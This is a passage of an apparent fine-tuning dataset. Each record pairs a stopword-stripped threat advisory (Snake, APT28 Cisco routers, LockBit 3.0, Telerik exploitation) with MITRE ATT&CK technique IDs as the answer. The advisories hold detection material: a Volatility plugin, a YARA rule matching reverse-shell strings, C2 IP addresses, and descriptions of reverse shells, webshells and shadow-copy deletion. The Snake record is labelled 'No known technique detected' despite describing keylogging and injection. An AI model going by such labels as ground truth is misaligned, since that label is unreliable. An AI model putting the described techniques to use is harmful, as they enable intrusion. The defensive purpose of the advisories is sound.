snake bypasses many behaviors snake employs hide memory analysis tool volatility detection snake compromise may possiblesnakes principal user mode component injected chosen process via single allocation pageexecutereadwrite memory starting offset generally 0x20000000 however module allow relocation needed additionally since user mode component obfuscated way valid pe header located beginning allocated memory region validation performed confirming presence strings known exist user mode component also within memory region plugin compatible volatility3 scan processes system using method provided appendix screenshot showing results plugin successfully detecting snake displayed prevention note mitigations follow meant protect initial access vector designed prevent snakes persistence hiding techniques change credentials apply updates system owners believed compromised snake advised change credentials immediately noncompromised system use type passwords similar used snake employs keylogger functionality routinely returns logs back fsb operators changing passwords usernames values brute forced guessed based old passwords recommended system owners advised apply updates operating systems modern versions windows linux macos make much harder adversaries operate kernel space make much harder fsb actors load snakes kernel driver target system execute organizational incident response plan system owners receive detection signatures snake implant activity indicators compromise associated fsb actors using snake impacted organization immediately initiate documented incident response plan recommend implementing following crosssector cybersecurity performance goals cpgs help defend fsb actors using snake mitigate negative impacts postcompromise cpg 2a changing default passwords prevent fsb actors compromising default credentials gain initial access move laterally within network cpg 2b requiring minimum password strength across organization prevent fsb actors able successfully conduct password spraying cracking operations cpg 2c requiring unique credentials prevent fsb actors compromising valid accounts password spraying brute force cpg 2e separating user privileged accounts make harder fsb actors gain access administrator credentials cpg 2f network segmentation deny connections default unless explicitly required specific system functionality ensure incoming communication going properly configured firewall cpg 2h implementing phishing resistant mfa adds additional layer security even account credentials compromised mitigate variety attacks towards valid accounts include brute forcing passwords exploiting external remote services software cpg 4c deploy securitytxt files ensure public facing web domains securitytxt file conforms recommendations rfc 9118 appendix partnership advisory developed joint effort international partnership multiple agencies furtherance respective cybersecurity missions partner agencies including responsibilities develop issue cybersecurity specifications mitigations partnership includes following organizations federal bureau investigation national security agency cybersecurity infrastructure security agency cyber national mission force united kingdoms national cyber security centre canadian centre cyber security communications security establishment australian cyber security centre new zealand national cyber security centre collectively use variety sources methods partnerships acquire information foreign cyber threats advisory contains information concluded publicly released consistent protection sources methods public interest disclaimer information report provided informational purposes endorse commercial product service including subjects analysis reference specific commercial products processes services service mark trademark manufacturer otherwise constitute imply endorsement recommendation favoring coauthors mitre attck techniques advisory uses mitre attck enterprise framework version 13 see mitre attck enterprise referenced tactics techniques mitre attck registered trademarks mitre corporation report references following mitre attck techniques volatility plugin following plugin volatility memory analysis framework scan processes system finds snake user mode component injected process found plugin list injected process virtual memory address snake user mode component loaded plugin identify injected usermode component snake based malfind plugin released volatility3 file copyright 2019 volatility foundation licensed volatility software license 10 available httpswwwvolatilityfoundationorglicensevslv10 import logging typing import iterable tuple volatility3framework import interfaces symbols exceptions renderers volatility3frameworkconfiguration import requirements volatility3frameworkobjects import utility volatility3frameworkrenderers import formathints volatility3pluginswindows import pslist vadinfo vollog logginggetloggername class snakeinterfacespluginsplugininterface requiredframeworkversion 2 4 0 classmethod def getrequirementscls return requirementsmodulerequirementname kernel description windows kernel architectures intel32 intel64 requirementsversionrequirementname pslist component pslistpslist version 2 0 0 requirementsversionrequirementname vadinfo component vadinfovadinfo version 2 0 0 classmethod def listinjections cls context interfacescontextcontextinterface kernellayername str symboltable str proc interfacesobjectsobjectinterface iterable tupleinterfacesobjectsobjectinterface bytes procid unknown try procid procuniqueprocessid proclayername procaddprocesslayer except exceptionsinvalidaddressexception excp vollogdebugprocess invalid address layer formatprocid excpinvalidaddress excplayername return proclayer contextlayersproclayername vad procgetvadroottraverse protectionstring vadgetprotectionvadinfovadinfo protectvaluescontext kernellayername symboltable vadinfowinntprotections pageexecutereadwrite protectionstring continue vadgetprivatememory 1 vadgettag vads vadgetprivatememory 0 protectionstring pageexecutewritecopy data proclayerreadvadgetstart vadgetsize pad true datafindbx4dx5a 0 continue yield vad data def generatorself procs kernel selfcontextmodulesselfconfigkernel is32bitarch symbolssymboltableis64bitselfcontext kernelsymboltablename proc procs processname utilityarraytostringprocimagefilename vad data selflistinjectionsselfcontext kernellayername kernelsymboltablename proc stringstofind bx25x73x23x31bx25x73x23x32 bx25x73x23x33bx25x73x23x34 bx2ex74x6dx70 bx2ex73x61x76 bx2ex75x70x64 allstringtofind data stringtofind stringstofind continue yield 0 procuniqueprocessid processname formathintshexvadgetstart formathintshexvadgetsize vadgetprotection vadinfovadinfoprotectvaluesselfcontext kernellayername kernelsymboltablename vadinfowinntprotections return def runself kernel selfcontextmodulesselfconfigkernel return rendererstreegridpid int process str address formathintshex length formathintshex protection str selfgeneratorpslistpslistlistprocesses context selfcontext layername kernellayername symboltable kernelsymboltablename product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: No known technique detected"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: apt28 accesses poorly maintained cisco routers deploys malware unpatched devices using cve20176742 overview context uk national cyber security centre ncsc us national security agency nsa us cybersecurity infrastructure security agency cisa us federal bureau investigation fbi releasing joint advisory provide details tactics techniques procedures ttps associated apt28s exploitation cisco routers 2021 assess apt28 almost certainly russian general staff main intelligence directorate gru 85th special service centre gtsss military intelligence unit 26165 apt28 also known fancy bear strontium pawn storm sednit gang sofacy highly skilled threat actor download uk pdf version report apt28 exploits known vulnerability carry reconnaissance deploy malware cisco routers pdf 36688 kb download us pdf version report apt28 exploits known vulnerability carry reconnaissance deploy malware cisco routers pdf 36625 kb previous activity ncsc previously attributed following activity apt28 cyber attacks german parliament 2015 including data theft disrupting email accounts german members parliament mps vice chancellor attempted attack organization prohibition chemical weapons opcw april 2018 disrupt independent analysis chemicals weaponized gru uk information apt28 activity see advisory russian statesponsored criminal cyber threats critical infrastructureand russian gru conducting global brute force campaign compromise enterprise cloud environments 2021 apt28 observed using commercially available code repositories postexploit frameworks empire included use powershell empire addition python versions empire reconnaissance use snmp protocol access routers 2021 apt28 used infrastructure masquerade simple network management protocol snmp access cisco routers worldwide included small number based europe us government institutions approximately 250 ukrainian victims snmp designed allow network administrators monitor configure network devices remotely also misused obtain sensitive network information vulnerable exploit devices penetrate network number software tools scan entire network using snmp meaning poor configuration using default easytoguess community strings make network susceptible attacks weak snmp community strings including default public allowed apt28 gain access router information apt28 sent additional snmp commands enumerate router interfaces compromised routers configured accept snmp v2 requests snmp v2 doesnt support encryption data including community strings sent unencrypted exploitation cve20176742 apt28 exploited vulnerability cve20176742 cisco bug id cscve54313 vulnerability first announced cisco 29 june 2017 patched software made available ciscos published advisory provided workarounds limiting access snmp trusted hosts disabling number snmp management information bases mibs malware deployment targeted devices apt28 actors used snmp exploit deploy malware detailed ncscs jaguar tooth malware analysis report malware obtained device information exfiltrated trivial file transfer protocol tftp enabled unauthenticated access via backdoor actor obtained device information executing number command line interface cli commands via malware includes discovery devices network querying address resolution protocol arp table obtain mac addresses indicators compromise iocs please refer accompanying malware analysis report indicators compromise may help detect activity mitre attck advisory compiled respect mitre attck framework globally accessible knowledge base adversary tactics techniques based realworld observations detailed ttps see malware analysis report conclusion apt28 known access vulnerable routers using default weak snmp community strings exploiting cve20176742 cisco bug id cscve54313 published cisco ttps advisory may still used vulnerable cisco devices organizations advised follow mitigation advice advisory defend activity reporting uk organizations report suspected compromises ncscus organizations also report anomalous cyber activity andor cyber incidents 247 toreportcisagovor calling 1844saycisa 18447292472 mitigation mitigation patch devices advised cisco ncsc also general guidance managing updates keeping software date use snmp required configure manage devices remotely prevent unauthorized users accessing router required manage routers remotely establish allow deny lists snmp messages prevent unauthorized users accessing router allow unencrypted ie plaintext management protocols snmp v2 telnet encrypted protocols arent possible carry management activities outside organization encrypted virtual private network vpn ends mutually authenticated enforce strong password policy dont reuse password multiple devices device unique password possible avoid legacy passwordbased authentication implement twofactor authentication based publicprivate key disable legacy unencrypted protocols telnet snmp v1 v2c possible use modern encrypted protocols ssh snmp v3 harden encryption protocols based current best security practice ncsc strongly advises owners operators retire replace legacy devices cant configured use snmp v3 use logging tools record commands executed network devices tacacs syslog use logs immediately highlight suspicious events keep record events support investigation devices integrity ever question see ncsc guidance monitoring logging suspect router compromised follow ciscos advice verifying cisco ios image revoke keys associated router replacing router configuration sure create new keys rather pasting old configuration replace rommon cisco ios image image sourced directly cisco website case third party internal repositories compromised nsas network infrastructure guide provides best practices snmp see also cisco ios hardening guide ciscos jaguar tooth blog product provided subject thisnotificationand thisprivacy usepolicy product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1078.001, T1190, T1590"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: actions take today mitigate cyber threats ransomware prioritize remediating known exploited vulnerabilities train users recognize report phishing attempts enable enforce phishingresistant multifactor authentication summary note joint cybersecurity advisory csa part ongoing stopransomware effort publish advisories network defenders detail ransomware variants ransomware threat actors stopransomware advisories include recently historically observed tactics techniques procedures ttps indicators compromise iocs help organizations protect ransomware visit stopransomwaregov see stopransomware advisories learn ransomware threats nocost resources federal bureau investigation fbi cybersecurity infrastructure security agency cisa multistate information sharing analysis center msisac releasing joint csa disseminate known lockbit 30 ransomware iocs ttps identified fbi investigations recently march 2023 lockbit 30 ransomware operations function ransomwareasaservice raas model continuation previous versions ransomware lockbit 20 lockbit since january 2020 lockbit functioned affiliatebased ransomware variant affiliates deploying lockbit raas use many varying ttps attack wide range businesses critical infrastructure organizations make effective computer network defense mitigation challenging fbi cisa msisac encourage organizations implement recommendations mitigations section csa reduce likelihood impact ransomware incidents download pdf version report stopransomware lockbit 30 pdf 68870 kb technical details note advisory uses mitre attck enterprise framework version 12 see mitre attck tactics techniques section table threat actors activity mapped mitre attck enterprise capabilities lockbit 30 also known lockbit black modular evasive previous versions shares similarities blackmatter blackcat ransomware lockbit 30 configured upon compilation many different options determine behavior ransomware upon actual execution ransomware within victim environment various arguments supplied modify behavior ransomware example lockbit 30 accepts additional arguments specific operations lateral movement rebooting safe mode see lockbit command line parameters indicators compromise lockbit affiliate access passwordless lockbit 30 ransomware password argument mandatory execution ransomware lockbit 30 affiliates failing enter correct password unable execute ransomware password cryptographic key decodes lockbit 30 executable protecting code manner lockbit 30 hinders malware detection analysis code unexecutable unreadable encrypted form signaturebased detections may fail detect lockbit 30 executable executables encrypted potion vary based cryptographic key used encryption also generating unique hash provided correct password lockbit 30 decrypt main component continue decrypt decompress code execute ransomware lockbit 30 infect machines language settings matching defined exclusion list however whether system language checked runtime determined configuration flag originally set compilation time languages exclusion list include limited romanian moldova arabic syria tatar russia language exclusion list detected lockbit 30 stop execution without infecting system initial access affiliates deploying lockbit 30 ransomware gain initial access victim networks via remote desktop protocol rdp exploitation driveby compromise phishing campaigns abuse valid accounts exploitation publicfacing applications execution infection process malware routine privileges sufficient lockbit 30 attempts escalate required privileges lockbit 30 performs functions enumerating system information hostname host configuration domain information local drive configuration remote shares mounted external storage devices terminating processes services launching commands enabling automatic logon persistence privilege escalation deleting log files files recycle bin folder shadow copies residing disk lockbit 30 attempts spread across victim network using preconfigured list credentials hardcoded compilation time compromised local account elevated privileges compiled lockbit 30 may also enable options spreading via group policy objects psexec using server message block smb protocol lockbit 30 attempts encrypt data saved local remote device skips files associated core system functions files encrypted lockbit 30 drops ransom note new filename ransomware idreadmetxt changes hosts wallpaper icons lockbit 30 branding needed lockbit 30 send encrypted host bot information command control c2 server completed lockbit 30 may delete disk well group policy updates made depending options set compilation time exfiltration lockbit 30 affiliates use stealbit custom exfiltration tool used previously lockbit 20 rclone opensource command line cloud storage manager publicly available file sharing services mega exfiltrate sensitive company data files prior encryption rclone many publicly available file sharing services primarily used legitimate purposes also used threat actors aid system compromise network exploration data exfiltration lockbit 30 affiliates often use publicly available file sharing services exfiltrate data well see table 1 leveraging freeware opensource tools lockbit affiliates observed using various freeware opensource tools intrusions tools used range activities network reconnaissance remote access tunneling credential dumping file exfiltration use powershell batch scripts observed across intrusions focus system discovery reconnaissance passwordcredential hunting privilege escalation artifacts professional penetrationtesting tools metasploit cobalt strike also observed see table 2 list legitimate freeware opensource tools lockbit affiliates repurposed ransomware operations indicators compromise iocs iocs malware characteristics outlined derived field analysis following samples current march 2023 lockbit 30 black icon lockbit 30 wallpaper lockbit command line parameters mutual exclusion object mutex created executed lockbit 30 create mutex globalmd4 hash machine guidand check see mutex already created avoid running one instance ransomware uac bypass via elevated com interface lockbit 30 capable bypassing user account control uac execute code elevated privileges via elevated component object model com interface cwindowssystem32dllhostexe spawned high integrity command line guid 3e5fc7f99a5143679063a120244fbec example system32dllhostexeprocessid3e5fc7f99a5143679063 a120244fbec7 volume shadow copy deletion lockbit 30 uses windows management instrumentation wmi identify delete volume shadow copies lockbit 30 uses select win32shadowcopy query volume shadow copies win32shadowcopyid obtain id shadow copy deleteinstance delete shadow copies registry artifacts safe mode launch commands lockbit 30 safe mode feature circumvent endpoint antivirus detection depending upon host operating system following command launched reboot system safe mode networking group policy artifacts following group policy extensible markup language xml files identified lockbit 30 infection servicesxml stops disables services active directory ad hosts registrypol following registry configuration changes values group policy refresh time disable smartscreen disable windows defender force gpupdate new group policies added powershell command using group policy update gpupdate applies new group policy changes computers ad domain services killed processes killed lockbit 30 ransom note network connections configured lockbit 30 send two http post requests one c2servers information victim host bot encrypted advanced encryption standard aes key encoded base64 user agent strings mitre attck techniques see table 3 referenced threat actor tactics techniques advisory assistance mapping mitre attck framework see cisas decider tool best practices mitre attck mapping guide mitigations fbi cisa msisac recommend organizations implement mitigations improve organizations cybersecurity posture basis lockbit 30s activity mitigations align crosssector cybersecurity performance goals cpgs developed cisa national institute standards technology nist cpgs provide minimum set practices protections cisa nist recommend organizations implement cisa nist based cpgs existing cybersecurity frameworks guidance protect common impactful ttps visit cisas crosssector cybersecurity performance goals information cpgs including additional recommended baseline protections implement recovery plan maintain retain multiple copies sensitive proprietary data serverscpg 73 physically separate segmented secure location eg hard drive storage device cloud require accounts password logins eg service account admin accounts domain admin accounts comply national institute standards technology nist standards developing managing password policiescpg 34 use longer passwords consisting least 8 characters 64 characters lengthcpg 14 store passwords hashed format using industryrecognized password managers add password user salts shared login credentials avoid reusing passwords implement multiple failed login attempt account lockoutscpg 11 disable password hints refrain requiring password changes frequently per yearnote nist guidance suggests favoring longer passwords instead requiring regular frequent password resets frequent password resets likely result users developing password patterns cyber criminals easily decipher require administrator credentials install software require phishingresistant multifactor authenticationcpg 13 services extent possible particularly webmail virtual private networks accounts access critical systems keep operating systems software firmware date timely patching one efficient costeffective steps organization take minimize exposure cybersecurity threats segment networkscpg 81 prevent spread ransomware network segmentation help prevent spread ransomware controlling traffic flows betweenand access tovarious subnetworks restricting adversary lateral movement identify detect investigate abnormal activity potential traversal indicated ransomware networking monitoring tool aid detecting ransomware implement tool logs reports network traffic including lateral movement activity networkcpg 51 endpoint detection response edr tools particularly useful detecting lateral connections insight common uncommon network connections host install regularly update enable real time detection antivirus software hosts review domain controllers servers workstations active directories new andor unrecognized accounts audit user accounts administrative privileges configure access controls according principle least privilegecpg 15 disable unused ports consider adding email banner emailscpg 83 received outside organization disable hyperlinks received emails implement timebased access accounts set admin level higher example justintime jit access method provisions privileged access needed support enforcement principle least privilege well zero trust model process networkwide policy set place automatically disable admin accounts active directory level account direct need individual users may submit requests automated process grants access specified system set timeframe need support completion certain task disable commandline scripting activities permissions privilege escalation lateral movement often depend software utilities running command line threat actors able run tools difficulty escalating privileges andor moving laterally maintain offline backups data regularly maintain backup restorationcpg 73 instituting practice organization ensures severely interrupted andor irretrievable data ensure backup data encrypted immutable ie altered deleted covers entire organizations data infrastructurecpg 33 validate security controls addition applying mitigations fbi cisa msisac recommend exercising testing validating organizations security program threat behaviors mapped mitre attck enterprise framework advisory fbi cisa msisac authoring agencies recommend testing existing security controls inventory assess perform attck techniques described advisoryto get started select attck technique described advisory see table 3 align security technologies technique test technologies technique analyze detection prevention technologies performance repeat process security technologies obtain set comprehensive performance data tune security program including people processes technologies based data generated process fbi cisa msisac recommend continually testing security program scale production environment ensure optimal performance mitre attck techniques identified advisory resources stopransomwaregov wholeofgovernment approach gives one central location ransomware resources alerts resource mitigate ransomware attack cisamultistate information sharing analysis center msisac joint ransomware guide nocost cyber hygiene services cyber hygiene services ransomware readiness assessment reporting fbi seeking information legally shared including boundary logs showing communication foreign ip addresses sample ransom note communications lockbit 30 actors bitcoin wallet information decryptor files benign sample encrypted file fbi cisa msisac encourage paying ransom payment guarantee victim files recovered furthermore payment may also embolden adversaries target additional organizations encourage criminal actors engage distribution ransomware andor fund illicit activities regardless whether organization decided pay ransom fbi cisa urge promptly report ransomware incidents local fbi field office cisa reportcisagov state local tribal territorial sltt government entities also report msisac soccisecurityorg 8667874722 disclaimer information report provided informational purposes fbi cisa msisac endorse commercial product service including subjects analysis reference specific commercial products processes services service mark trademark manufacturer otherwise constitute imply endorsement recommendation favoring fbi cisa msisac feedback important please take minutes share opinions product anonymous product feedback survey product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1003.001, T1021.001, T1027, T1046, T1048, T1070.004, T1071.002, T1072, T1078, T1082, T1133, T1189, T1190, T1480.001, T1485, T1486, T1489, T1490, T1547, T1566, T1567, T1567.002, T1572"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: summary november 2022 early january 2023 cybersecurity infrastructure security agency cisa authoring organizations identified presence indicators compromise iocs federal civilian executive branch fceb agency analysts determined multiple cyber threat actors including advanced persistent threat apt actor able exploit net deserialization vulnerability cve201918935 progress telerik user interface ui aspnet ajax located agencys microsoft internet information services iis web server successful exploitation vulnerability allows remote code execution according progress software telerik ui aspnet ajax builds r1 2020 20201114 vulnerable exploit1 update june 15 2023 april 2023 forensic analysis conducted additional fceb agency identified exploitation cve20179248 agencys iis server unattributed apt actorsspecifically within telerik ui aspnet ajax dialoghandler component specific analysis provided context existing vulnerabilities within telerik ui aspnet ajax update end actions take today mitigate malicious cyber activity implement patch management solution ensure compliance latest security patches validate output patch management vulnerability scanning running services check discrepancies account services limit service accounts minimum permissions necessary run services cisa federal bureau investigation fbi multistate information sharing analysis center msisac releasing joint cybersecurity advisory csa provide infrastructure defenders tactics techniques procedures ttps iocs methods detect protect similar exploitation download pdf version report threat actors exploit progress telerik vulnerabilities multiple us government iis servers pdf 66168 kb downloadable copy iocs see json file aa23074a stix xml xml 3096 kb copies malware analysis reports mars accompanying csa mar104130621v1 cve201918935 exploitation us government iis server update june 15 2023 mar104438631v1 cve20179248 exploitation us government iis server update end technical details note advisory uses mitre attck enterprise framework version 12 see mitre attck tactics techniques section table threat actors activity mapped mitre attck tactics techniques corresponding detection mitigation recommendations overview cisa authoring organizationsassess beginning late november 2022 threat actors successfully exploited net deserialization vulnerability cve201918935 instance telerik ui aspnet ajax q2 2013 sp1 version 20132717 running fceb agencys microsoft iis server exploit results interactive access web server enabled threat actors successfully execute remote code vulnerable web server though agencys vulnerability scanner appropriate plugin cve201918935 failed detect vulnerability due telerik ui software installed file path typically scan may case many software installations file paths widely vary depending organization installation method addition cve201918935 version 20132717 telerik ui aspnet ajax contains following known vulnerabilities cve201711357 cve201711317 cve20179248 update june 15 2023 forensic analysis conducted additional fceb agency identified exploitation cve20179248 agencys iis server unattributed apt actorsspecifically within telerik ui aspnet ajax dialoghandler component activity identified agency separate cve201918935 exploitation listed throughout csa analysis provided context existing vulnerabilities within telerik ui aspnet ajax analysis concluded agencys iis server operated outdated version telerik ui aspnet ajax 200931120835 identified via telerikwebuidll file located servers net framework directory noted telerik ui aspnet ajax versions prior 20172621 considered cryptographically weak weakness radasyncupload function uses encryption secure uploaded files proofofconcept code publicly available since january 20182 note apt actors listed june 2023 update observed leveraging virtual private servers vps route traffic target due constant change incurred use different vps infrastructures timeline lists threat actorcontrolled ips likely relevant hunting specified narrow timeline activity recommended blocking table 1 timeline unattributed apt actor activity cve20179248 cisa authoring organizations unable identify privilege escalation lateral movement data exfiltration however presence webshells file uploads indicated apt actors maintained access potential conduct additional malicious activity information identified malicious files table 1 see mar104438631v1 cve20179248 exploitation us government iis server update end analysis suggests cyber threat actors exploited cve201918935 conjunction either cve201711357 cve201711317 australian cyber security centre acsc advisory 2020004 assesses exploitation cve201918935 possible knowledge telerik radasyncupload encryption keys3 threat actors obtain keys either prior knowledge exploitation vulnerabilitiescve201711357 cve201711317present older unpatched versions telerik released 2007 2017 forensic evidence available todefinitively confirm exploitation either cve201711357 cve201711317 threat actor activity cisa authoring organizations observed multiple cyber threat actors including apt actorhereafter referred threat actor 1 ta1and known cybercriminal actor xe grouphereafter referred threat actor 2 ta2conducting reconnaissance scanning activities correlate successful exploitation cve201918935 agencys iis server running telerik ui aspnet ajax exploiting vulnerability threat actors uploaded malicious dynamiclink library dll files masqueraded portable network graphicspng files cwindowstemp directory malicious files executed cwindowstemp directory via w3wpexe processa legitimate process runs iis servers process routine handling requests sent web servers delivering content review antivirus logs identified dll files created detected early august 2021 cisa authoring organizations confirmed malicious files dropped iis server consistent previously reported file naming convention threat actors commonly use exploiting cve2019189354 threat actors name files unix epoch time format use date time recorded target system file naming convention follows pattern10 digits7 digitsdll eg file created october 31 2022 could 16672030235321205dll names png files misleading example file 15968353295015914png decodes august 7 2020 212209 utc first appeared october 13 2022 file system shows creation date august 7 2020 uncorrelated unix epoch time format may indicate threat actors used timestomping technique file naming convention primary ioc used threat actors many cases malicious artifacts available analysis threat actors malwarethat looks removes files dll file extensionremoved files cwindowstemp directory full packet data capture analysis reverse engineering malicious dll files indications additional malicious activity subprocesses found executed w3wpexe process cisa observed error messages sent threat actors command control c2 server permission restraints prevented service account executing malicious dlls writing new files network activity analysis consistent artifacts provided review analysts observe evidence privilege escalation lateral movement threat actor 1 cisa authoring organizations observed ta1 exploiting cve201918935 system enumeration beginning august 2022 vulnerability allows threat actor upload malicious dlls target system execute abusing legitimate process eg w3wpexe process instance ta1 able upload malicious dll files cwindowstemp directory achieve remote code execution executing dll files via w3wpexe process least nine dll files used discovery c2 defense evasion analyzed samples network parameters including host name domain name domain name system dns server internet protocol ip address machine name network basic inputoutput system netbios id adapter information ip address subnet gateway ip dynamic host configuration protocol dhcp server analyzed samples communicate collected data c2 server ip address 137184130162 457721212 c2 traffic ip addresses uses nonapplication layer protocol leveraging transmission control protocol tcp clear text ie unencrypted port 443 analysis also identified analyzed samples load additional libraries enumerate system processes files directories write files analyzed samples delete dll files ending dll extension cwindowstemp directory server ta1 may use capability hide additional malicious activity network cisa coordination authoring organizations identified observed following threat actor ips timestamps associated activity threat actor 2 ta2identified likely cybercriminal actor xe groupoften includes xeword nomenclature original filenames registered domains volexity lists naming convention observed ttps common threat actor group5 early august 2021 cisa authoring organizations observed ta2 delivering malicious png files following analysis masqueraded dll files avoid detection similar ta1 ta2 exploited cve201918935 able upload least three unique dll files cwindowstemp directory ta2 executed via w3wpexe process dll files drop execute reverse remote shell utilities unencrypted communication c2 ip addresses associated malicious domains listed table 3 note time analysis domains resolved listed ip addresses analysis dll files determined files listed table 4were dropped decoded attempted connect respective malicious domains embedded payloads dropped dll files observed using command line utility certutilexe writing new files xesvrsexe invoke reverse shell utilities execution ta2 malware executed dll file drops executable xereverseshellexe attempts pull c2 ip address port number xeworkcom xegroupscom port ip address found program exit port ip address found program establish listener wait commands communication established ta2 malware c2 malware identify operating system windows linux create appropriate shell cmd bash sending system information back c2 c2 server may send command xesetshell causing malware connect server download file called smalltxta base64encoded webshell malware decodes places cwindowstemp directory c2 server may send command xequit causing malware sleep period time determined threat actors two files xesmartshelltmp sortvistacompat capability drop active server pages aspx webshella base64 encoded text file smalltxt decoded smallaspxto enumerate drives send receive delete files execute incoming commands webshell contains interface easily browsing files directories drives system allows user upload download files directory webshells observed dropped target system likely due abused service account restrictive write permissions information dlls binaries webshell see cisa mar104130621v1 cve201918935 exploitation us government iis server mitre attck tactics techniques see tables 510 referenced threat actor tactics techniques advisory assistance mapping mitre attck framework see cisas decider tool best practices mitre attck mapping guide update june 15 2023 table 6 resource development table 7 initial access table 8 execution table 9 persistence table 10 command control update end detection methods cisa authoring organizations recommend organizations review steps listed section tables 510 identified attck techniques enterprise detect similar activity iis servers yara rule cisa developed following yara rule base proofofconcept code cve2019189356 note authoring organizations guarantee malicious dll files identified use code provided yara rule rule cisa1042401801 meta author cisa code media analysis incident 10424018 date 20230207 lastmodified 202302161500 actor na family na capabilities na malwaretype na tooltype na description detects opensource exploit samples sha256 na strings s0 3d 20 7b 20 22 63 6d 22 2c 20 22 64 2e 65 22 2c s1 20 22 78 22 2c 20 22 65 22 20 7d 3b s2 52 65 76 65 72 73 65 53 68 65 6c 6c 28 29 s3 54 65 6c 65 72 69 6b 20 55 49 s4 66 69 6c 65 6e 61 6d 65 5f 6c 6f 63 61 6c s5 66 69 6c 65 6e 61 6d 65 5f 72 65 6d 6f 74 65 s6 41 55 43 69 70 68 65 72 2e 65 6e 63 72 79 70 74 s7 31 32 31 66 61 65 37 38 31 36 35 62 61 33 64 34 s8 43 6f 6e 6e 65 63 74 53 74 61 67 69 6e 67 53 65 72 76 65 72 28 29 s9 53 74 61 67 69 6e 67 53 65 72 76 65 72 53 6f 63 6b 65 74 s10 2a 62 75 66 66 65 72 20 3d 20 28 75 6e 73 69 67 6e 65 s11 28 2a 29 28 29 29 62 75 66 66 65 72 3b 0a 20 20 20 20 66 75 6e 63 28 29 3b s12 75 70 6c 6f 61 64 28 70 61 79 6c 6f 61 64 28 54 65 6d 70 54 61 72 67 65 74 s13 36 32 36 31 36 66 33 37 37 35 36 66 32 66 conditions0 s1 s2 s3 s4 s5 s6 s7 s8 s9 s10 s11 s12 s13 log collection retention analysis cisa fbi msisac recommend organizations utilize centralized log collection monitoring capability well implement increase logging forensic data retention longer retention policies improve availability data forensic analysis aid thorough identification incident scope centralized log collection monitoring allows discovery webshell exploit activity example organizations monitor external connections made iis server unknown external ip addresses logging may also availableif enabled router firewallfor outbound connections initiated powershell access securityfocused firewall eg web application firewallwaf logs collected stored use detection forensic analysis activities organizations use waf guard publicly known web application vulnerabilities addition guarding common web application attacks creation malicious dlls cisa fbi msisac recommend organizations use process monitoringwhich provides visibility file system application process activityto detect suspicious executable files running cwindowstemp directory process monitoring via windows event code 4688 detect legitimate w3wpexe process running suspicious dll files anomalous child processes note enabling event may inundate security event logging use centralized log collection prevent log rollover increase log retention archiving andor enable command line event logging forensic analysis commonly identified threat actors taking following steps create one dll files cwindowstemp16658901878690152dll process w3wpexe pid 6484 load newly created dll currently running iis process w3wpexe pid 6484 make tcp connection using w3wpexe pid 6484 457721212 port 443 invoke cwindowssystem32vcruntime140dll windows c runtime library execute payload steps 1 2 occur every time malicious dll file created cases asp net temp file created may indicated benign iis server activity note process id pid used example unique investigation universal ip address 457721212 correlates ta1 pattern used general practice identify similar activity additional searching iis servers following information derived artifact analysis provided equip infrastructure defenders searching similar activity iis server several artifacts referenced assist determining cve201918935 successfully exploited file type dll location systemdrivewindowstemp cve exploited uploads malicious dll files cwindowstemp directory malicious dll file naming convention translates exact time file uploaded server time represented series digits known unix epoch time files observed investigation contained two sets digits separated period dll extension dll example 16672069732270932dll nearly recovered files contain series 10 digits left period seven digits right however one file contained five digits second set taken consideration writing regex patterns search existence files example regex d10d18dll numbers copied translated digits readable language month day year hour minute seconds displayed log type iis location systemdriveinetpublogslogfiles investigating iis logs specific fields searched captured time connection unix epoch time signature translated dll filename specific logs searched based time however unix epoch time signature translated following still work may take longer query run four important fields identify traffic noted following table descriptions sourced directly microsoft7 note depending logs collected stored field names may exact match taken consideration constructing queries ingesting logs security information event management siem final field names use hyphen used underscore example csmethod instead csmethod artifacts reviewing logs two iis events observed timestamp time cve201918935 exploited events contained information csmethod csuristem csuriquery one event scstatus 200 scstatus 302 log type windows event application logs location systemdrivewindowssystem32winevtlogsapplicationevtx kroll artifact parser extractor kape forensic artifact collector parser used extract windows event logs backup image compromised iis server field names refer labels provided via kape exports strings value used locate artifacts different tools used note payload data following table shortened necessary strings obscure protect victim information authoring organizations recommend looking following key strings payload w3wpexe parent process executes code inside malicious dlls systemconfigurationinstallassemblyinstaller figure 1 creators github repo8 string observed code presented bishop fox proven authoring organizationsinvestigation iis server logs exception mean exploit failed likely executed successfully4 figure 1 threat actor assembly installer werfault crash report written windows event application logs may contain evidence even dlls removed system part cleanup effort threat actors eventid field maps windows eventids easy filter users leverage windows eventids find malicious dll unix epoch timebased name inside cwindowstemp directory depending log analysis performed various filters determined however regex available example listed table 14 reused match unix epoch timestamp convention assist filtering additional analysis evidence malicious dlls found reverse engineering need conducted fully understand actions occur malicious files could nearly anything leveraging windows security event logs well windows powershell logs may provide insight actions dlls taking cisa authoring organizations recommendthe following process convert discovered malicious dll timestamps readable format export windows security event powershell logs device default path systemdrivewindowssystem32winevtlogswindows powershell default path systemdrivewindowssystem32winevtlogssecurityevtx filter based identified timestamps search new processes created via w3wpexe windows security event logs eg windows eventid 4688 new process created search new pids identified events investigate determine spawned processes example cmdexe launching powershell running commands nslookup netstat note exhaustive list search eventid 600 powershell logs trellix xdr platform searching trellix xdr platform deployed environment standard hx triage audit completed timely manner suspected use cve201918935 organization search file write events known web processes identify executables written web server process cisa authoring organizationsspecifically recommend searching following field value pair mitigations note mitigations align crosssector cybersecurity performance goals cpgs developed cisa national institute standards technology nist cpgs provide minimum set practices protections cisa nist recommend organizations implement cisa nist based cpgs existing cybersecurity frameworks guidance protect common impactful threats tactics techniques procedures visit cisas crosssector cybersecurity performance goals information cpgs including additional recommended baseline protections manage vulnerabilities configurations upgrade instances telerik ui aspnet ajax latest version appropriate testing keep software date prioritize patching known exploited vulnerabilities kevscpg 51 prioritize remediation vulnerabilities internetfacing systems additional guidance see cisa insights remediate vulnerabilities internetaccessible 